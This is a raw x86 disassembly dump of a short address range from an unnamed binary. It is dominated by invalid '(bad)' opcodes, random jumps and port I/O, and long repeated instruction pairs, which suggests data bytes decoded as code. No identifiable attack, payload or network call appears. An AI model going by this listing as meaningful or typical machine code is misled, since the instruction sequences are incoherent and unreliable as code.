  41675e:	(bad)  
  416760:	test   BYTE PTR [ecx],cl
  416762:	scas   eax,DWORD PTR es:[edi]
  416763:	repz or cl,BYTE PTR [edi-0x33]
  416767:	adc    al,0x3e
  416769:	xchg   DWORD PTR [eax],ecx
  41676b:	jle    0x41674b
  41676d:	loope  0x4166f8
  41676f:	sub    DWORD PTR [eax],ebx
  416771:	(bad)  
  416772:	loopne 0x4167e1
  416774:	cmp    edi,DWORD PTR [ecx]
  416776:	cmc    
  416777:	xchg   ecx,eax
  416778:	jecxz  0x416739
  41677a:	inc    edi
  41677b:	jmp    0xf30e167
  416780:	retf   
  416781:	mov    BYTE PTR [ebp-0x1f1e40de],bh
  416787:	jns    0x41674b
  416789:	cmp    ch,dh
  41678b:	cmp    DWORD PTR [ebx],0xb7e947c3
  416791:	ins    DWORD PTR es:[edi],dx
  416792:	out    dx,eax
  416793:	out    0xc2,al
  416795:	mov    BYTE PTR [ebp-0x1f21813e],bh
  41679b:	xor    eax,0x2ef538db
  4167a0:	push   0xffffffdd
  4167a2:	retf   0x8ff1
  4167a5:	in     eax,0x81
  4167a7:	sbb    eax,0xc1598c74
  4167ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167ad:	cmp    eax,0xaef5
	...
  4167c2:	add    BYTE PTR [eax],al
  4167c4:	adc    BYTE PTR [ebp-0x78],dl
  4167c7:	jmp    0x95f1fc5b
  4167cc:	jecxz  0x416843
  4167ce:	or     BYTE PTR [edx+0x7f],ah
  4167d1:	nop    DWORD PTR [edx+0x4f]
  4167d5:	xchg   ecx,eax
  4167d6:	mov    DWORD PTR [edx-0xb838675],ebp
  4167dc:	rcl    BYTE PTR [edx+edi*2+0x7bc11786],1
  4167e3:	sub    BYTE PTR [eax+0x5e70180b],dl
  4167e9:	adc    eax,0x540ee5c8
  4167ee:	or     al,0x14
  4167f0:	fs ret 0xe947
  4167f4:	frstor [edi]
  4167f6:	push   ecx
  4167f7:	add    BYTE PTR [edi-0x73],ah
  4167fa:	or     BYTE PTR [ebx-0x62],dl
  4167fd:	gs sub al,0x8
  416800:	push   es
  416801:	pop    edx
  416802:	loopne 0x4167fc
  416804:	push   0x46
  416806:	jne    0x4167cb
  416808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416809:	xchg   ecx,eax
  41680a:	or     BYTE PTR [eax],al
  41680c:	ins    DWORD PTR es:[edi],dx
  41680d:	pop    ebp
  41680e:	jl     0x416851
  416810:	cmc    
  416811:	mov    edx,0x12f58917
  416816:	mov    DWORD PTR [esi+eiz*2],0x613d0c51
  41681d:	fdiv   QWORD PTR ds:0xb0566700
  416823:	je     0x416885
  416825:	ror    BYTE PTR [eax],1
  416827:	mov    eax,DWORD PTR [eax]
	...
  416839:	add    BYTE PTR [eax],al
  41683b:	add    dh,dl
  41683d:	mov    edx,0x8cf68318
  416842:	xchg   eax,eax
  416844:	mov    cl,0x86
  416846:	cld    
  416847:	jne    0x4168ad
  416849:	nop
  41684a:	jp     0x41683b
  41684c:	outs   dx,BYTE PTR ds:[esi]
  41684d:	push   edx
  41684e:	or     al,0x0
  416850:	cmp    BYTE PTR [ecx+0x28c983e9],0x58
  416857:	push   esi
  416858:	cs add BYTE PTR gs:[ebx+0x45819470],cl
  416860:	sub    eax,0x8e85780
  416865:	dec    eax
  416866:	repz (bad) 
  416868:	fmul   st,st(5)
  41686a:	clc    
  41686b:	push   eax
  41686c:	clc    
  41686d:	rol    DWORD PTR [eax],cl
  41686f:	push   eax
  416870:	std    
  416871:	das    
  416872:	lock (bad) 
  416874:	fidiv  DWORD PTR [ebp+0x1375e849]
  41687a:	(bad)  
  41687b:	adc    BYTE PTR [esi],dl
  41687d:	pop    ecx
  41687e:	xlat   BYTE PTR ds:[ebx]
  41687f:	clc    
  416880:	jmp    0x4a57:0x8c746047
  416887:	add    BYTE PTR [ecx],cl
  416889:	lock rcl BYTE PTR [eax+0x24],0x50
  41688e:	ret    0x2bfd
  416891:	arpl   WORD PTR [ebp+0x74],bx
  416894:	int    0x2b
  416896:	jbe    0x4168db
  416898:	sbb    al,0x1b
  41689a:	shr    DWORD PTR [ebp+0x15],1
  41689d:	outs   dx,BYTE PTR ds:[esi]
  41689e:	ret    
  41689f:	push   0x0
	...
  4168b4:	sbb    BYTE PTR [edi],0x4a
  4168b7:	add    BYTE PTR [ecx],dl
  4168b9:	call   0xc25b98e
  4168be:	ret    0xf3fd
  4168c1:	shl    DWORD PTR ds:0xd8f017fc,0x87
  4168c8:	dec    ecx
  4168c9:	aas    
  4168ca:	jb     0x416927
  4168cc:	fdiv   QWORD PTR [ecx+0x6807f425]
  4168d2:	aam    0x87
  4168d4:	push   ecx
  4168d5:	pop    edi
  4168d6:	jb     0x416933
  4168d8:	mov    ah,0xd2
  4168da:	shl    BYTE PTR [ebp+ecx*2+0x2b],1
  4168de:	jbe    0x416923
  4168e0:	mov    ah,0x9a
  4168e2:	aam    0x39
  4168e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168e5:	cmc    
  4168e6:	ret    
  4168e7:	push   0x497698
  4168ec:	or     DWORD PTR [eax-0x24],esi
  4168ef:	push   eax
  4168f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168f1:	pop    edi
  4168f2:	ret    0x8bfd
  4168f5:	xchg   al,dl
  4168f7:	je     0x4168c6
  4168f9:	cmp    eax,0x6e644376
  4168fe:	aam    0x1d
  416900:	jne    0x41691d
  416902:	les    ecx,FWORD PTR [ecx+0x4370b1c9]
  416908:	pop    esp
  416909:	mov    ch,0x4e
  41690b:	cld    
  41690c:	add    eax,0xb189dca1
  416911:	xchg   esp,eax
  416912:	push   ebx
  416913:	js     0x4168e4
  416915:	cmp    al,0x78
  416917:	inc    esi
	...
  41692c:	cmp    BYTE PTR [esi],bl
  41692e:	mov    esp,0xdca8a4db
  416933:	inc    edx
  416934:	mov    WORD PTR [ecx],fs
  416936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416937:	retf   
  416938:	mov    esp,0x21cb483c
  41693d:	xor    al,0xc7
  41693f:	push   edi
  416940:	lahf   
  416941:	aad    0xdf
  416943:	jle    0x416914
  416945:	and    al,0xaf
  416947:	fcomi  st,st(5)
  416949:	sub    al,0x16
  41694b:	int3   
  41694c:	je     0x4168f6
  41694e:	xchg   esp,eax
  41694f:	inc    edx
  416950:	mov    WORD PTR [ecx],fs
  416952:	lods   al,BYTE PTR ds:[esi]
  416953:	fistp  DWORD PTR [esp+edi*1+0x2c]
  416957:	retf   
  416958:	jmp    0x4fc00690
  41695d:	sub    al,0x8f
  41695f:	fist   DWORD PTR [eax]
  416961:	sub    eax,0xdb07cbe6
  416966:	div    DWORD PTR [ebx]
  416968:	pop    ss
  416969:	fcmove st,st(7)
  41696b:	xor    al,0xb4
  41696d:	stos   DWORD PTR es:[edi],eax
  41696e:	xlat   BYTE PTR ds:[ebx]
  41696f:	retf   
  416970:	mov    ecx,0x59f4ad17
  416975:	and    DWORD PTR [esp+ebx*8],esp
  416978:	cmp    al,0x3c
  41697a:	pop    ecx
  41697b:	int3   
  41697c:	mov    eax,ds:0x132f1d33
  416981:	inc    ecx
  416982:	add    al,0xc6
  416984:	test   BYTE PTR [esp+esi*1-0x7cea9083],dl
  41698b:	js     0x416910
  41698d:	xor    ebx,edi
  41698f:	add    BYTE PTR ss:[eax],al
	...
  4169a2:	add    BYTE PTR [eax],al
  4169a4:	loop   0x416971
  4169a6:	push   0x29
  4169a8:	test   BYTE PTR [edi],bl
  4169aa:	hlt    
  4169ab:	not    DWORD PTR [esi]
  4169ad:	sbb    DWORD PTR [edi-0x36],ebx
  4169b0:	popa   
  4169b1:	xor    ecx,DWORD PTR [eax]
  4169b3:	sbb    DWORD PTR [eax],edi
  4169b5:	enter  0x6ef6,0x47
  4169b9:	mov    esi,0xa75bd108
  4169be:	inc    edi
  4169bf:	jmp    0x5734a52b
  4169c4:	inc    edi
  4169c5:	sbb    edx,0x63
  4169c8:	or     ch,BYTE PTR [eax]
  4169ca:	jnp    0x416974
  4169cc:	(bad)  
  4169cd:	sbb    al,0xc
  4169cf:	sti    
  4169d0:	leave  
  4169d1:	adc    eax,0x43d3d1f2
  4169d6:	int    0x64
  4169d8:	shl    BYTE PTR [edx],0xf5
  4169db:	es xchg ecx,eax
  4169dd:	xchg   esp,eax
  4169de:	or     cl,ch
  4169e0:	loop   0x4169a9
  4169e2:	jg     0x4169fd
  4169e4:	jns    0x4169fd
  4169e6:	jl     0x4169f7
  4169e8:	(bad)  
  4169e9:	xor    BYTE PTR [edi],dh
  4169eb:	sbb    ecx,ebx
  4169ed:	arpl   WORD PTR [ecx-0xacdc39c],ax
  4169f3:	neg    BYTE PTR [eax+0x17]
  4169f6:	je     0x4169e7
  4169f8:	(bad)  
  4169f9:	xor    ch,dh
  4169fb:	ins    BYTE PTR es:[edi],dx
  4169fc:	pop    ebx
  4169fd:	xor    dh,ch
  4169ff:	fiadd  WORD PTR [edx+0x1f]
  416a02:	je     0x4169db
  416a04:	(bad)  
  416a05:	xor    BYTE PTR ds:0x8f,al
	...
  416a1b:	add    BYTE PTR [edx+0x2b46e815],cl
  416a21:	out    dx,eax
  416a22:	jae    0x4169e3
  416a24:	(bad)  
  416a25:	xor    BYTE PTR ds:0xf083867f,al
  416a2b:	popa   
  416a2c:	mov    BYTE PTR [edx+0x9],bl
  416a2f:	jmp    0xa3cb4106
  416a34:	ja     0x4169e5
  416a36:	or     ebp,DWORD PTR [ecx-0x76]
  416a39:	xchg   esp,eax
  416a3a:	jnp    0x4169e3
  416a3c:	mov    ebp,0x9500e0ca
  416a41:	pop    esi
  416a42:	repz push esi
  416a45:	hlt    
  416a46:	outs   dx,DWORD PTR ds:[esi]
  416a47:	(bad)  
  416a48:	loop   0x416aa8
  416a4a:	or     BYTE PTR [eax-0x588669e2],al
  416a50:	mov    dh,0x1c
  416a52:	jo     0x416a52
  416a54:	loop   0x416ab4
  416a56:	or     BYTE PTR [ebp-0x3d],dh
  416a59:	lods   al,BYTE PTR ds:[esi]
  416a5a:	mov    DWORD PTR [eax+0x50f35ec3],eax
  416a60:	mov    ebp,0x62fff15b
  416a65:	jle    0x416abd
  416a67:	pop    ebx
  416a68:	lods   al,BYTE PTR ds:[esi]
  416a69:	dec    ecx
  416a6a:	push   ecx
  416a6b:	ret    0x962d
  416a6e:	pop    ecx
  416a6f:	mov    DWORD PTR [eax+0x3b535865],ebx
  416a75:	mov    bl,0x59
  416a77:	or     BYTE PTR [esi+0x7c],ch
  416a7a:	add    al,0x8b
  416a7c:	sbb    BYTE PTR [esi],ah
  416a7e:	es leave 
	...
  416a94:	pop    edi
  416a95:	xor    DWORD PTR [esi],eax
  416a97:	mov    BYTE PTR [ecx],ch
  416a99:	sub    eax,0x28e98afd
  416a9e:	lea    eax,[esp+edi*4]
  416aa1:	fadd   DWORD PTR [edi-0x1e264207]
  416aa7:	push   ebx
  416aa8:	xchg   DWORD PTR [eax-0x5c],edx
  416aab:	cli    
  416aac:	loop   0x416b09
  416aae:	and    eax,0xf2c50d2
  416ab3:	mov    bh,BYTE PTR [ecx+0x1d013a87]
  416ab9:	xchg   ebp,eax
  416aba:	dec    edx
  416abb:	sbb    edi,0x30
  416abe:	jno    0x416ab0
  416ac0:	xchg   esp,eax
  416ac1:	out    0x81,eax
  416ac3:	inc    esp
  416ac4:	mov    BYTE PTR [ebp-0x80],bl
  416ac7:	add    al,0x67
  416ac9:	xlat   BYTE PTR ds:[ebx]
  416aca:	xchg   edx,edi
  416acc:	mov    WORD PTR [ebx],?
  416ace:	dec    ebp
  416acf:	icebp  
  416ad0:	shl    BYTE PTR [esi+0x71],cl
  416ad3:	in     al,dx
  416ad4:	leave  
  416ad5:	std    
  416ad6:	out    dx,eax
  416ad7:	jmp    DWORD PTR [ebx+0x3b]
  416ada:	or     DWORD PTR [eax],eax
  416adc:	mov    WORD PTR [ebx],?
  416ade:	or     DWORD PTR [eax],eax
  416ae0:	mov    WORD PTR [ebx],?
  416ae2:	or     DWORD PTR [eax],eax
  416ae4:	mov    WORD PTR [ebx],?
  416ae6:	or     DWORD PTR [eax],eax
  416ae8:	mov    WORD PTR [ebx],?
  416aea:	or     DWORD PTR [eax],eax
  416aec:	mov    WORD PTR [ebx],?
  416aee:	or     DWORD PTR [eax],eax
  416af0:	mov    WORD PTR [ebx],?
  416af2:	or     DWORD PTR [eax],eax
  416af4:	mov    WORD PTR [ebx],?
  416af6:	or     DWORD PTR [eax],eax
	...
  416b0c:	mov    WORD PTR [ebx],?
  416b0e:	or     DWORD PTR [eax],eax
  416b10:	mov    WORD PTR [ebx],?
  416b12:	or     DWORD PTR [eax],eax
  416b14:	mov    WORD PTR [ebx],?
  416b16:	or     DWORD PTR [eax],eax
  416b18:	mov    WORD PTR [ebx],?
  416b1a:	or     DWORD PTR [eax],eax
  416b1c:	mov    WORD PTR [ebx],?
  416b1e:	or     DWORD PTR [eax],eax
  416b20:	mov    WORD PTR [ebx],?
  416b22:	or     DWORD PTR [eax],eax
  416b24:	mov    WORD PTR [ebx],?
  416b26:	or     DWORD PTR [eax],eax
  416b28:	mov    WORD PTR [ebx],?
  416b2a:	or     DWORD PTR [eax],eax
  416b2c:	mov    WORD PTR [ebx],?
  416b2e:	or     DWORD PTR [eax],eax
  416b30:	mov    WORD PTR [ebx],?
  416b32:	or     DWORD PTR [eax],eax
  416b34:	mov    WORD PTR [ebx],?
  416b36:	or     DWORD PTR [eax],eax
  416b38:	mov    WORD PTR [ebx],?
  416b3a:	or     DWORD PTR [eax],eax
  416b3c:	mov    WORD PTR [ebx],?
  416b3e:	or     DWORD PTR [eax],eax
  416b40:	mov    WORD PTR [ebx],?
  416b42:	or     DWORD PTR [eax],eax
  416b44:	mov    WORD PTR [ebx],?
  416b46:	or     DWORD PTR [eax],eax
  416b48:	mov    WORD PTR [ebx],?
  416b4a:	or     DWORD PTR [eax],eax
  416b4c:	mov    WORD PTR [ebx],?
  416b4e:	or     DWORD PTR [eax],eax
  416b50:	mov    WORD PTR [ebx],?
  416b52:	or     DWORD PTR [eax],eax
  416b54:	mov    WORD PTR [ebx],?
  416b56:	or     DWORD PTR [eax],eax
  416b58:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b5f:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416b66:	fild   WORD PTR [ebx]
  416b68:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b6f:	add    eax,DWORD PTR [eax]
	...
  416b81:	add    BYTE PTR [eax],al
  416b83:	add    BYTE PTR [esp+edx*4-0x6b73fc21],cl
  416b8a:	fild   WORD PTR [ebx]
  416b8c:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b93:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416b9a:	fild   WORD PTR [ebx]
  416b9c:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416ba3:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416baa:	fild   WORD PTR [ebx]
  416bac:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416bb3:	add    ecx,DWORD PTR [esp+edx*4-0x65790214]
  416bba:	xor    BYTE PTR [ebx],0x58
  416bbd:	mov    ebp,0x655a2381
  416bc2:	lds    edx,FWORD PTR [ebx]
  416bc4:	stos   DWORD PTR es:[edi],eax
  416bc5:	je     0x416b86
  416bc7:	push   ss
  416bc8:	lods   al,BYTE PTR ds:[esi]
  416bc9:	je     0x416c46
  416bcb:	pop    ebx
  416bcc:	das    
  416bcd:	je     0x416c21
  416bcf:	pop    ecx
  416bd0:	arpl   ax,ax
  416bd2:	inc    ebx
  416bd3:	popa   
  416bd4:	ds je  0x416c2a
  416bd7:	pop    esp
  416bd8:	das    
  416bd9:	je     0x416c1c
  416bdb:	popa   
  416bdc:	and    BYTE PTR [eax+0x6a6c5244],ch
  416be2:	sbb    cl,bh
  416be4:	test   ebx,edx
  416be6:	or     BYTE PTR [esi+0x0],al
	...
  416bf9:	add    BYTE PTR [eax],al
  416bfb:	add    BYTE PTR [eax],bh
  416bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bfe:	jp     0x416c40
  416c00:	jmp    0x416bbe
  416c02:	jl     0x416bcd
  416c04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c05:	mov    ch,0x1f
  416c07:	leave  
  416c08:	mov    al,ds:0x94d12f67
  416c0d:	bound  edi,QWORD PTR [eax]
  416c0f:	fstp   DWORD PTR [eax-0x57ff958c]
  416c15:	fisub  DWORD PTR [ebp+0x4]
  416c18:	mov    esi,0xa8076bb9
  416c1d:	xlat   BYTE PTR ds:[ebx]
  416c1e:	push   0xfffffffa
  416c20:	lods   al,BYTE PTR ds:[esi]
  416c21:	mov    esi,0xc0c90924
  416c26:	or     DWORD PTR fs:[esi-0x49],edi
  416c2a:	ins    DWORD PTR es:[edi],dx
  416c2b:	rol    ebx,0xa5
  416c2e:	sub    BYTE PTR [ebx-0x44945a54],bh
  416c34:	shl    DWORD PTR [ebx-0x62eaf094],1
  416c3a:	add    esp,ebx
  416c3c:	push   esp
  416c3d:	sar    DWORD PTR [edx-0x3c],0xaf
  416c41:	mov    bh,0x66
  416c43:	(bad)  
  416c44:	pop    edx
  416c45:	mov    ds:0xb74b8863,al
  416c4a:	xchg   DWORD PTR gs:[ebp+0x5b956074],eax
  416c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c52:	xor    dl,dh
  416c54:	jp     0x416bff
  416c56:	jge    0x416cce
  416c58:	xor    DWORD PTR [edi-0x41938596],0x7e79
	...
  416c72:	add    BYTE PTR [eax],al
  416c74:	imul   ebp,DWORD PTR [eax-0x4ca1b783],0xbb634a26
  416c7e:	and    eax,0x299b5e4
  416c83:	jmp    0x4a0117
  416c88:	mov    ch,0x92
  416c8a:	or     BYTE PTR [eax],al
  416c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c8d:	xchg   edx,eax
  416c8e:	or     BYTE PTR [eax],al
  416c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c91:	xchg   edx,eax
  416c92:	or     BYTE PTR [eax],al
  416c94:	jne    0x416c28
  416c96:	or     BYTE PTR [eax],al
  416c98:	jne    0x416c2c
  416c9a:	or     BYTE PTR [eax],al
  416c9c:	gs xchg edx,eax
  416c9e:	or     BYTE PTR [eax],al
  416ca0:	gs xchg edx,eax
  416ca2:	or     BYTE PTR [eax],al
  416ca4:	jne    0x416c38
  416ca6:	or     BYTE PTR [eax],al
  416ca8:	jne    0x416c3c
  416caa:	or     BYTE PTR [eax],al
  416cac:	gs xchg edx,eax
  416cae:	or     BYTE PTR [eax],al
  416cb0:	gs xchg edx,eax
  416cb2:	or     BYTE PTR [eax],al
  416cb4:	xor    eax,0x35000892
  416cb9:	xchg   edx,eax
  416cba:	or     BYTE PTR [eax],al
  416cbc:	and    eax,0x18000892
  416cc1:	pop    ds
  416cc2:	inc    esi
  416cc3:	imul   esi,DWORD PTR [esp+esi*2+0x21],0x4
  416cc8:	arpl   di,di
  416cca:	pop    ebx
  416ccb:	in     al,dx
  416ccc:	js     0x416cc1
  416cce:	imul   ebp,DWORD PTR ds:0x56ff154a,0x110d2c08
	...
  416cec:	xor    DWORD PTR [edi],esp
  416cee:	ins    DWORD PTR es:[edi],dx
  416cef:	in     al,0x3d
  416cf1:	fcom   QWORD PTR [edi-0x72]
  416cf4:	in     eax,0x91
  416cf6:	or     BYTE PTR [eax],al
  416cf8:	cmc    
  416cf9:	xchg   ecx,eax
  416cfa:	or     BYTE PTR [eax],al
  416cfc:	cmc    
  416cfd:	xchg   ecx,eax
  416cfe:	or     BYTE PTR [eax],al
  416d00:	in     eax,0x91
  416d02:	or     BYTE PTR [eax],al
  416d04:	in     eax,0x91
  416d06:	or     BYTE PTR [eax],al
  416d08:	mov    ch,0x91
  416d0a:	or     BYTE PTR [eax],al
  416d0c:	mov    ch,0x91
  416d0e:	or     BYTE PTR [eax],al
  416d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d11:	xchg   ecx,eax
  416d12:	or     BYTE PTR [eax],al
  416d14:	mov    WORD PTR [ebx],?
  416d16:	or     DWORD PTR [eax],eax
  416d18:	mov    WORD PTR [ebx],?
  416d1a:	or     DWORD PTR [eax],eax
  416d1c:	mov    WORD PTR [ebx],?
  416d1e:	or     DWORD PTR [eax],eax
  416d20:	mov    WORD PTR [ebx],?
  416d22:	or     DWORD PTR [eax],eax
  416d24:	mov    WORD PTR [ebx],?
  416d26:	or     DWORD PTR [eax],eax
  416d28:	mov    WORD PTR [ebx],?
  416d2a:	or     DWORD PTR [eax],eax
  416d2c:	mov    WORD PTR [ebx],?
  416d2e:	or     DWORD PTR [eax],eax
  416d30:	mov    WORD PTR [ebx],?
  416d32:	or     DWORD PTR [eax],eax
  416d34:	mov    WORD PTR [ebx],?
  416d36:	or     DWORD PTR [eax],eax
  416d38:	mov    WORD PTR [ebx],?
  416d3a:	or     DWORD PTR [eax],eax
  416d3c:	mov    WORD PTR [ebx],?
  416d3e:	or     DWORD PTR [eax],eax
  416d40:	mov    WORD PTR [ebx],?
  416d42:	or     DWORD PTR [eax],eax
  416d44:	mov    WORD PTR [ebx],?
  416d46:	or     DWORD PTR [eax],eax
  416d48:	mov    WORD PTR [ebx],?
  416d4a:	or     DWORD PTR [eax],eax
  416d4c:	mov    WORD PTR [ebx],?
  416d4e:	or     DWORD PTR [eax],eax
	...
  416d64:	mov    WORD PTR [ebx],?
  416d66:	or     DWORD PTR [eax],eax
  416d68:	mov    WORD PTR [ebx],?
  416d6a:	or     DWORD PTR [eax],eax
  416d6c:	mov    WORD PTR [ebx],?
  416d6e:	or     DWORD PTR [eax],eax
  416d70:	mov    WORD PTR [ebx],?
  416d72:	or     DWORD PTR [eax],eax
  416d74:	mov    WORD PTR [ebx],?
  416d76:	or     DWORD PTR [eax],eax
  416d78:	mov    WORD PTR [ebx],?
  416d7a:	or     DWORD PTR [eax],eax
  416d7c:	mov    WORD PTR [ebx],?
  416d7e:	or     DWORD PTR [eax],eax
  416d80:	mov    WORD PTR [ebx],?
  416d82:	or     DWORD PTR [eax],eax
  416d84:	mov    WORD PTR [ebx],?
  416d86:	or     DWORD PTR [eax],eax
  416d88:	mov    WORD PTR [ebx],?
  416d8a:	or     DWORD PTR [eax],eax
  416d8c:	mov    WORD PTR [ebx],?
  416d8e:	or     DWORD PTR [eax],eax
  416d90:	mov    WORD PTR [ebx],?
  416d92:	or     DWORD PTR [eax],eax
  416d94:	mov    WORD PTR [ebx],?
  416d96:	or     DWORD PTR [eax],eax
  416d98:	mov    WORD PTR [ebx],?
  416d9a:	or     DWORD PTR [eax],eax
  416d9c:	mov    WORD PTR [ebx],?
  416d9e:	or     DWORD PTR [eax],eax
  416da0:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416da7:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416dae:	fild   WORD PTR [ebx]
  416db0:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416db7:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416dbe:	fild   WORD PTR [ebx]
  416dc0:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416dc7:	add    eax,DWORD PTR [eax]
	...
  416dd9:	add    BYTE PTR [eax],al
  416ddb:	add    BYTE PTR [esp+edx*4-0x6b73fc21],cl
  416de2:	fild   WORD PTR [ebx]
  416de4:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416deb:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416df2:	fild   WORD PTR [ebx]
  416df4:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416dfb:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416e02:	fild   WORD PTR [ebx]
  416e04:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416e0b:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416e12:	fild   WORD PTR [ebx]
  416e14:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416e1b:	add    ecx,DWORD PTR [esp+edx*4+0x609d11d0]
  416e22:	fmul   QWORD PTR ds:0x5080a48c
  416e28:	pop    ebp
  416e29:	mov    ds:0x94685186,eax
  416e2e:	or     BYTE PTR [ecx+0x67],bh
  416e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e32:	push   0xffffff8b
  416e34:	(bad)  
  416e35:	mov    ebx,0xa0824c7d
  416e3a:	outs   dx,DWORD PTR ds:[esi]
  416e3b:	jmp    0x1d7ad3f8
	...
  416e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e55:	sub    ebx,DWORD PTR [edi+0x44]
  416e58:	pop    ebx
  416e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e5a:	jns    0x416e45
  416e5c:	mov    al,ds:0x94f53965
  416e61:	popa   
  416e62:	cmp    eax,0x3a7b8ff1
  416e67:	cli    
  416e68:	jnp    0x416e95
  416e6a:	push   0x3a7bb30b
  416e6f:	fimul  DWORD PTR [edi-0x62e29448]
  416e75:	mov    bh,0x5f
  416e77:	dec    DWORD PTR [edi-0x5c059460]
  416e7d:	xchg   esp,eax
  416e7e:	fs push cs
  416e80:	xchg   esi,eax
  416e81:	mov    bh,0x8
  416e83:	mov    eax,0xf9086441
  416e88:	push   0x7ede79a5
  416e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e8e:	ins    BYTE PTR es:[edi],dx
  416e8f:	sbb    BYTE PTR [eax+0x7bc56bbc],cl
  416e95:	mov    ecx,0xba5ebc08
  416e9a:	popa   
  416e9b:	int3   
  416e9c:	pop    eax
  416e9d:	xchg   esp,eax
  416e9e:	ins    BYTE PTR es:[edi],dx
  416e9f:	mov    ebx,0xc765b168
  416ea4:	(bad)  
  416ea5:	mov    al,ds:0xa0bab47a
  416eaa:	xchg   si,ax
  416eac:	add    BYTE PTR [ebx],ch
  416eae:	cmp    al,bl
  416eb0:	clc    
  416eb1:	jns    0x416eea
  416eb3:	fmul   DWORD PTR [edi+0x7e64b3]
	...
  416ec9:	add    BYTE PTR [eax],al
  416ecb:	add    BYTE PTR [ebp+0x2006fb7],ah
  416ed1:	ins    BYTE PTR es:[edi],dx
  416ed2:	or     BYTE PTR [ecx],dh
  416ed4:	pop    ss
  416ed5:	and    bh,BYTE PTR [ecx]
  416ed7:	xor    eax,0x72f52e0b
  416edc:	or     eax,0x5a6f6c70
  416ee1:	nop
  416ee2:	and    eax,0x3a2c9632
  416ee7:	mov    ch,BYTE PTR ss:[eax]
  416eea:	add    BYTE PTR ds:[esi+0x78],dl
  416eee:	jp     0x416f59
  416ef0:	push   esi
  416ef1:	ins    BYTE PTR es:[edi],dx
  416ef2:	or     BYTE PTR [ebx+0x58],dh
  416ef5:	data16 ja 0x416f60
  416ef8:	int3   
  416ef9:	imul   ax,WORD PTR [eax],0x6fc0
  416efe:	ja     0x416f74
  416f00:	mov    BYTE PTR [edx+0x8],ah
  416f03:	arpl   WORD PTR [edx-0x768a879d],ax
  416f09:	jnp    0x416f85
  416f0b:	add    BYTE PTR [ebp-0x7991929e],al
  416f11:	jnp    0x416f8a
  416f13:	jae    0x416f7a
  416f15:	bound  ebp,QWORD PTR [ebp+0x67]
  416f18:	call   0x6365:0x8b007a7b
  416f1f:	je     0x416f68
  416f21:	jno    0x416f87
  416f23:	ins    BYTE PTR es:[edi],dx
  416f24:	and    eax,0x58676671
  416f29:	jp     0x416f33
  416f2b:	push   0x48
  416f2d:	arpl   WORD PTR [ecx+0x73],di
	...
  416f44:	adc    al,0x96
  416f46:	and    eax,0x37211632
  416f4b:	xor    esi,ebp
  416f4d:	outs   dx,BYTE PTR ds:[esi]
  416f4e:	pusha  
  416f4f:	popa   
  416f50:	cmp    DWORD PTR [ebp+0x7e],edi
  416f53:	gs pop ss
  416f55:	xchg   esi,eax
  416f56:	outs   dx,BYTE PTR ds:[esi]
  416f57:	jb     0x416f61
  416f59:	jge    0x416fc7
  416f5b:	outs   dx,DWORD PTR ds:[esi]
  416f5c:	mov    WORD PTR [eax],ss
  416f5e:	or     DWORD PTR [ecx+0x75],ebp
  416f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f62:	and    eax,0x2c3b5e63
  416f67:	jno    0x416fd1
  416f69:	adc    DWORD PTR [ecx],ecx
  416f6b:	jno    0x416fa8
  416f6d:	push   ds
  416f6e:	arpl   WORD PTR cs:[esi],di
  416f71:	cmp    edi,DWORD PTR [esi]
  416f73:	jae    0x416fb1
  416f75:	fdivr  DWORD PTR [esi]
  416f77:	imul   ebp,DWORD PTR ds:0x356b0cd9,0xffffffde
  416f7e:	and    al,0x5f
  416f80:	sub    DWORD PTR [edi+0xc],esp
  416f83:	popa   
  416f84:	and    al,0xd8
  416f86:	sub    eax,0x223b2971
  416f8b:	outs   dx,BYTE PTR ds:[esi]
  416f8c:	add    cl,bl
  416f8e:	outs   dx,BYTE PTR ds:[esi]
  416f90:	jmp    0xebab7bf4
  416f95:	mov    fs,WORD PTR [ebx+esi*2]
  416f98:	in     eax,dx
  416f99:	cmp    ebx,DWORD PTR [edi]
  416f9b:	jae    0x416f8c
  416f9d:	xchg   esi,eax
  416f9e:	xor    DWORD PTR [ebp-0x27],ebp
  416fa1:	cmp    ebp,DWORD PTR [ebx]
  416fa3:	ins    BYTE PTR es:[edi],dx
  416fa4:	icebp  
  416fa5:	cs cmp al,0x63
	...
  416fbc:	call   0xbfa09afc
  416fc1:	cwde   
